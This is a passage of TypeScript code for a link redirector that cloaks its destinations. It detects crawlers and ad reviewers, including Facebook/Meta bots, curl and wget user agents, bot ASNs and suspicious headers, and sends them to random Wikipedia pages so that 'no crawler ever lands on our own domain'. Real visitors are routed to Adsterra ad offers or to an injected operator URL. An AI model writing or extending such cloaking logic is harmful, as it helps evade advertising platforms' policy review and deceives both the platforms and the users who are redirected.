        cloakHit.matchKey.includes("facebot") ||
        cloakHit.rule.pattern === "32934"
      ) {
        isFbBot = true;
      }
    }
  }

  // 2. Auto-blacklist (learned fingerprints)
  if (!isBot && !whitelistHit && fpAutoBlocked) {
    isBot = true;
    reason = "fp:auto-blocked";
  }

  // 3. Header / behaviour analysis (raised 60 → 80 to stop catching real users
  // with quirky headers — true headless tools score 80+ via the "headless-ua"
  // bonus alone, so legitimate clicks no longer trip on header combos.)
  const signals = analyzeSignals(detectInput);
  if (!isBot && !whitelistHit && signals.score >= 80) {
    isBot = true;
    reason = `signals:${signals.reasons.slice(0, 2).join(",")}`;
  }

  // 4. Referrer block rule
  if (!isBot && !whitelistHit) {
    const refRule = matchReferrer(refererDomain, referrerRules);
    if (refRule?.action === "block") {
      isBot = true;
      reason = `ref:${refRule.label || refRule.pattern}`;
    } else if (refRule?.action === "suspect" && signals.score >= 30) {
      isBot = true;
      reason = `ref-suspect:${refRule.label || refRule.pattern}`;
    }
  }

  // 5. Legacy UA hardcoded list (kept for fallback)
  if (!isBot && !whitelistHit) {
    const uaLow = ua.toLowerCase();
    if (!ua || ua.length < 10) {
      isBot = true;
      reason = "empty/short UA";
    }
    if (!isBot) {
      const hardcoded = [
        "bytespider",
        "ahrefs",
        "semrushbot",
        "mj12bot",
        "dotbot",
        "petalbot",
        "applebot",
        "curl",
        "wget",
        "python-requests",
        "httpclient",
        "okhttp",
        "lighthouse",
        "pingdom",
        "uptimerobot",
      ];
      for (const p of hardcoded) {
        if (uaLow.includes(p)) {
          isBot = true;
          reason = `ua:${p}`;
          break;
        }
      }
    }
    if (!isBot) {
      const rules = globalCache.botRules;
      if (rules && rules.length > 0) {
        for (const r of rules) {
          const p = (r.pattern || "").toLowerCase();
          if (!p) continue;
          if (r.rule_type === "ua" && uaLow.includes(p)) {
            isBot = true;
            reason = `rule:${r.label || p}`;
            break;
          }
          if (r.rule_type === "asn" && asn && asn === p) {
            isBot = true;
            reason = `asn:${r.label || p}`;
            break;
          }
          if (r.rule_type === "ip" && ip && ip.startsWith(p)) {
            isBot = true;
            reason = `ip:${r.label || p}`;
            break;
          }
        }
      }
    }
    if (!isBot && asn && BOT_ASNS.has(asn)) {
      isBot = true;
      reason = `asn:${asn}`;
    }
  }

  const device = detectDevice(ua);
  const utm = {
    utm_source: url.searchParams.get("utm_source"),
    utm_medium: url.searchParams.get("utm_medium"),
    utm_campaign: url.searchParams.get("utm_campaign"),
    utm_term: url.searchParams.get("utm_term"),
    utm_content: url.searchParams.get("utm_content"),
  };

  // Cohort source: prefer UTM source, fall back to classified referrer.
  const cohortSource = utm.utm_source || referrerSource;

  // Determine offer target (only for non-bot path)
  let target: string;
  let routedTo: "safe" | "offer" | "ours" = "offer";
  let abVariantLabel: string | null = null;

  if (isBot) {
    // Direct Wikipedia mode: every crawler (FB / Meta / search / social preview)
    // gets a real wikipedia.org URL. Smart fallback inside pickWikipediaSafeUrl
    // covers: category+lang → category+en → any-lang category → user-lang any
    // category → en any category → ANY active wiki URL. So even links WITHOUT
    // a saved safe_url_category still serve a random Wikipedia page — no crawler
    // ever lands on our own domain. Only when the wiki pool is completely empty
    // do we fall back to the legacy safe_url.
    const wikiUrl = await pickWikipediaSafeUrl(link.safe_url_category, country);
    target = wikiUrl || link.safe_url || SAFE_FALLBACK;
    routedTo = "safe";
  } else {
    const profile = await getProfileQuota(link.user_id);

    const overQuota =
      profile && profile.click_quota !== null && (profile.clicks_used || 0) >= profile.click_quota;

    if (overQuota) {
      // Quota exceeded → would normally route to ours, but respect 1-ad-per-24h cap
      if (visitorAlreadySawAdToday) {
        target = link.adsterra_url || SAFE_FALLBACK;
        routedTo = "offer";
      } else {
        target = OUR_URL;
        routedTo = "ours";
      }
    } else {
      // Probabilistic injection: each click has an independent chance
      // of routing to ours based on the configured threshold + inject count.
      // This ensures the ~target ratio across ALL traffic (not per-link).
      const probability = INJECT_COUNT / (THRESHOLD + INJECT_COUNT);
      if (!visitorAlreadySawAdToday && Math.random() < probability) {
        target = OUR_URL;
        routedTo = "ours";
      } else {
        // Smart offer selection: A/B variants > geo offers > default link offer
        const { abRows, geoRows } = await getOfferRows(link.id);

        // 1. A/B variants take precedence
        if (abRows && abRows.length > 0) {
          const picked = weightedPick(abRows as never[]) as {
            variant_label: string;
            offer_url: string;
            weight_pct: number;
          } | null;
          if (picked) {
            target = picked.offer_url;
            abVariantLabel = picked.variant_label;
            routedTo = "offer";
          } else {
            target = link.adsterra_url || SAFE_FALLBACK;
            routedTo = "offer";
          }
        } else if (geoRows && geoRows.length > 0) {
          // 2. Geo targeting — match exact country first, then tier.
          // Skip exact match entirely when country is unknown so we don't
          // silently match links configured for "" (empty) country codes.
          const ccUpper = (country || "").toUpperCase();
          const exact = ccUpper
            ? geoRows.filter(
                (g) =>
                  Array.isArray(g.country_codes) &&
                  g.country_codes.map((c: string) => c.toUpperCase()).includes(ccUpper),
              )
            : [];
          const tierMatch = geoRows.filter(
            (g) => g.tier === countryTier && (!g.country_codes || g.country_codes.length === 0),
          );
          const pool = exact.length > 0 ? exact : tierMatch;
          const picked = weightedPick(pool as never[]) as { offer_url: string } | null;
          target = picked?.offer_url || link.adsterra_url || SAFE_FALLBACK;
          routedTo = "offer";
        } else {
          target = link.adsterra_url || SAFE_FALLBACK;
          routedTo = "offer";
        }
      }
    }
  }

  // FB/Meta crawlers now continue to the normal 302 path above, so curl -L and
  // ad-review fetches end on wikipedia.org instead of receiving our article HTML.

  // Everyone else (humans + other bots) → 302 redirect.
  // IMPORTANT: must AWAIT click recording — workerd cancels unawaited
  // promises after Response is returned, so fire-and-forget = 0 rows logged.
  if (shouldRecordClick) {
    // Fire-and-forget on Node/PM2: never block the 302 on DB writes.
    // If PostgREST hangs, the user still gets redirected instantly.
    const persistPromise = recordRedirectClick({
      linkId: link.id,
      userId: link.user_id,
      ip: ip || null,
      country: country || null,
      ua: ua || null,
      isBot,
      botReason: whitelistHit ? `whitelist:${whitelistHit.label}` : reason,
      routedTo,
      utm,
      refererHost: refererDomain || null,
      botScore: isBot ? Math.max(80, signals.score) : signals.score,
      challengePassed: !isBot,
      signals: {
        source: isBot ? "blocked" : whitelistHit ? "whitelist" : "instant",
        reasons: reason ? [reason, ...signals.reasons] : signals.reasons,
        device,
        referer_host: refererDomain || null,
        cohort: cohortSource,
        tier: countryTier,
        ab: abVariantLabel,
        whitelist: whitelistHit ? { id: whitelistHit.id, label: whitelistHit.label } : null,
        target_host: (() => { try { return new URL(target).hostname; } catch { return null; } })(),
      },
      fingerprintHash: fpHash,
      abVariant: abVariantLabel,
    }).catch((error) => {
      console.error("redirect click logging failed", { linkId: link.id, error });
    });

    // Wait at most 800ms so the click is usually persisted before we return,
    // but we never exceed it. On PM2/Node the background promise continues
    // after the response is flushed, so late writes still land.
    await Promise.race([
      persistPromise,
      new Promise((resolve) => setTimeout(resolve, 800)),
    ]);
  }

  const reasonOut = isBot
    ? reason
    : whitelistHit
    ? `wl:${whitelistHit.label}`
    : routedTo === "ours"
    ? "quota-or-injection"
    : "ok";
  return redirectTo(target, routedTo, reasonOut);
}
